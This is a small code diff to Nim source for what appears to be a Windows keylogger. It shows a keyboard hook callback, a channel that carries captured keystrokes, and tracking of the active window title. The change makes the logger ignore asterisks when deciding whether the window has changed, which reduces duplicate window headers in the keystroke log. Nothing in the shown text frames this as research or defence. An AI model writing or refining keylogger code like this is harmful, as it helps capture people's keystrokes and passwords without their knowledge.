@@ -292,7 +292,6 @@ const
 
 var channel_klout: Channel[string]
 var channel_klstop: Channel[int]
-
 var currentActiveWindow : LPWSTR 
 
 proc GetActiveWindowTitle(): LPWSTR {.gcsafe.} = 
@@ -325,7 +324,7 @@ proc hook_callback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdc
         
         var newActiveWindow = GetActiveWindowTitle()
 
-        if $newActiveWindow != $currentActiveWindow:
+        if ($newActiveWindow).replace("*", "") != ($currentActiveWindow).replace("*", ""):
             currentActiveWindow = newActiveWindow
             channel_klout.send("\n" & fmt"[Window: '{currentActiveWindow}']" & "\n")
         # Send key pressed to queue
